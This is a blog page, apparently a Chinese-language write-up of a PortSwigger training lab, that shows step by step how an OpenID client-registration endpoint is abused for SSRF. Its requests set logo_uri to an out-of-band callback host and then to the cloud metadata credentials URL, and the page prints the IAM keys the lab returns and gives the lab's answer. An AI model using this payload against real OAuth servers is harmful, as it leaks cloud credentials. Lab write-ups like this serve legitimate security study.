@@ -1,0 +1,109 @@
+<!doctype html><html lang=en><head><title>[Write Up]Lab: SSRF via OpenID dynamic client registration :: en1r0py</title>
+<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Lab description "><meta name=keywords content="write-up,portswigger,oauth"><meta name=robots content="noodp"><link rel=canonical href=/portswigger-posts/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration/><link rel=stylesheet href=/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css><link rel=stylesheet href=/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css><link rel=stylesheet href=/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css><link rel=stylesheet href=/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css><link rel=stylesheet href=/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css><link rel=stylesheet href=/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css><link rel=stylesheet href=/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css><link rel=stylesheet href=/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css><link rel=stylesheet href=/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css><link rel=stylesheet href=/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css><link rel=stylesheet href=/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css><link rel=stylesheet href=/css/terminal.min.dd0bf9c7cacb24c1b0184f52f1869b274e06689557468cc7030ccf632328eb97.css><link rel=stylesheet href=/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel="shortcut icon" href=/favicon.png><link rel=apple-touch-icon href=/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="[Write Up]Lab: SSRF via OpenID dynamic client registration"><meta property="og:description" content="Lab description "><meta property="og:url" content="/portswigger-posts/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration/"><meta property="og:site_name" content="en1r0py"><meta property="og:image" content="/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2024-12-16 22:09:47 +0800 +0800"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://en1r0py1865.github.io/><div class=logo>en1r0py1865</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/about>About</a></li><li><a href=/portswigger>Portswigger Academy</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About</a></li><li><a href=/portswigger>Portswigger Academy</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=/portswigger-posts/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration/>[Write Up]Lab: SSRF via OpenID dynamic client registration</a></h1><div class=post-meta><time class=post-date>2024-12-16</time></div><span class=post-tags>#<a href=/tags/write-up/>write-up</a>&nbsp;
+#<a href=/tags/portswigger/>portswigger</a>&nbsp;
+#<a href=/tags/oauth/>oauth</a>&nbsp;
+#<a href=/tags/openid/>openid</a>&nbsp;</span><div class=post-content><div><h2 id=lab-description>Lab description<a href=#lab-description class=hanchor arialabel=Anchor>#</a></h2><p><img alt="Lab description" src=/img/2024/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration-1.jpg></p><h2 id=solution>Solution<a href=#solution class=hanchor arialabel=Anchor>#</a></h2><ol><li>使用<code>wiener:peter</code>进行登录</li><li>在进行<code>OAuth</code>认证过程中出现Request<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> /auth?client_id=l1kif2c33dzynw35u6gk4&amp;redirect_uri=https://0a5f004403a359e4821360e0001b0098.web-security-academy.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net</span>
+</span></span></code></pre></div></li><li>根据<code>OpenAPI doc</code>此站点包含<code>/.well-known/openid-configuration</code><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> /.well-known/openid-configuration <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span> <span style=color:#ae81ff>200</span> <span style=color:#a6e22e>OK</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>&#34;registration_endpoint&#34;: &#34;https://oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net/reg&#34;,
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div></li><li>根据上述返回注册接口在<code>/reg</code><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>POST</span> /reg <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span> <span style=color:#ae81ff>400</span> <span style=color:#a6e22e>Bad Request</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>&lt;div class=&#34;container&#34;&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#ae81ff>&lt;h1&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#ae81ff>oops! something went wrong</span>
+</span></span><span style=display:flex><span>        <span style=color:#ae81ff>&lt;/h1&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#ae81ff>&lt;pre&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#ae81ff>&lt;strong&gt;</span>
+</span></span><span style=display:flex><span>                <span style=color:#ae81ff>error</span>
+</span></span><span style=display:flex><span>            <span style=color:#ae81ff>&lt;/strong&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#ae81ff>: invalid_redirect_uri</span>
+</span></span><span style=display:flex><span>        <span style=color:#ae81ff>&lt;/pre&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#ae81ff>&lt;pre&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#ae81ff>&lt;strong&gt;</span>
+</span></span><span style=display:flex><span>                <span style=color:#ae81ff>error_description</span>
+</span></span><span style=display:flex><span>            <span style=color:#ae81ff>&lt;/strong&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#ae81ff>: redirect_uris is mandatory property</span>
+</span></span><span style=display:flex><span>        <span style=color:#ae81ff>&lt;/pre&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>&lt;/div&gt;</span>
+</span></span></code></pre></div></li><li>根据错误提示，新增<code>redirect_uris</code>参数后再次发送注册Request<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>POST</span> /reg <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net</span>
+</span></span><span style=display:flex><span>Content-Type<span style=color:#f92672>:</span> <span style=color:#ae81ff>application/json</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;redirect_uris&#34;</span> : [
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;https://example.com&#34;</span>
+</span></span><span style=display:flex><span>    ]
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span> <span style=color:#ae81ff>201</span> <span style=color:#a6e22e>Created</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>&#34;client_id&#34;: &#34;aMAjpQBJD2zyyZncdGkIj&#34;,
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div></li><li><code>client_id</code>为<code>aMAjpQBJD2zyyZncdGkIj</code>，OAuth流程中，显示客户端应用程序的Logo的url为<code>/client/client_id/logo</code>，对应此<code>client id</code>为<code>/client/aMAjpQBJD2zyyZncdGkIj/logo</code><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> /client/aMAjpQBJD2zyyZncdGkIj/logo <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span> <span style=color:#ae81ff>204</span> <span style=color:#a6e22e>No Content</span>
+</span></span></code></pre></div></li><li>再次尝试发送注册Request，但通过Burp Collaborator进行SSRF确认<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>POST</span> /reg <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net</span>
+</span></span><span style=display:flex><span>Content-Type<span style=color:#f92672>:</span> <span style=color:#ae81ff>application/json</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;redirect_uris&#34;</span> : [
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;https://example.com&#34;</span>
+</span></span><span style=display:flex><span>    ],
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;logo_uri&#34;</span>: <span style=color:#e6db74>&#34;https://zy1o9naqos7cl7panwuxbipwdnjg76vv.oastify.com&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span> <span style=color:#ae81ff>201</span> <span style=color:#a6e22e>Created</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>&#34;client_id&#34;: &#34;9TGhjHvJ5yt_dd8perlem&#34;,
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div></li><li>再次访问logo页面<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> /client/9TGhjHvJ5yt_dd8perlem/logo <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span> <span style=color:#ae81ff>200</span> <span style=color:#a6e22e>OK</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>z3rtv6ubc6nwvqezt9d66gzjlgigz
+</span></span></code></pre></div></li><li>发现对应的ID，确认有SSRF
+<img alt=SSRF src=/img/2024/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration-2.jpg></li><li>再次访问注册接口发送SSRF目的url<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>POST</span> /reg <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net</span>
+</span></span><span style=display:flex><span>Content-Type<span style=color:#f92672>:</span> <span style=color:#ae81ff>application/json</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;redirect_uris&#34;</span> : [
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;https://example.com&#34;</span>
+</span></span><span style=display:flex><span>    ],
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;logo_uri&#34;</span>: <span style=color:#e6db74>&#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span> <span style=color:#ae81ff>201</span> <span style=color:#a6e22e>Created</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>&#34;client_id&#34;: &#34;tAOED8w2AuaL-FxSbvIC3&#34;,
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div></li><li>访问logo接口<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> /client/tAOED8w2AuaL-FxSbvIC3/logo <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2</span> <span style=color:#ae81ff>200</span> <span style=color:#a6e22e>OK</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>&#34;Code&#34; : &#34;Success&#34;,
+</span></span><span style=display:flex><span>&#34;LastUpdated&#34; : &#34;2024-12-16T14:38:58.426705184Z&#34;,
+</span></span><span style=display:flex><span>&#34;Type&#34; : &#34;AWS-HMAC&#34;,
+</span></span><span style=display:flex><span>&#34;AccessKeyId&#34; : &#34;0diucLF19YlhXiJF7A72&#34;,
+</span></span><span style=display:flex><span>&#34;SecretAccessKey&#34; : &#34;Nb9HY7w7BExzierfGxfOjvEuRIypEJgcoak1yx2l&#34;,
+</span></span><span style=display:flex><span>&#34;Token&#34; : &#34;IFNf1gUdELbDeobXF7HuzY6UO9oIbmqVlZoGVz5FOgBrjTtj3MCdyWv4db8fWuz4im1IpTcNnlMX5XSLUOykAlqratcwiQ92TCTK2WmChL21TTT7c9ZITVr7kjECRDXxTASWCLQKLAqqBKQnj5o3ytsACHy3J0oekv2wQgMxSL3ApTwFyhdniVP1c79efZ3hHn6VZ700htMe6W4LdgJ4Y1JSutbcUxOIDR7k2oEKMiXIJk7ZJDRxTYbEZN5oZf1p&#34;,
+</span></span><span style=display:flex><span>&#34;Expiration&#34; : &#34;2030-12-15T14:38:58.426705184Z&#34;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div></li><li>回到页面点击最上方<code>Submit solution</code>输入<code>Nb9HY7w7BExzierfGxfOjvEuRIypEJgcoak1yx2l</code>即可解题</li></ol></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2024 Powered by <a href=https://gohugo.io>Hugo</a></span>
+<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>
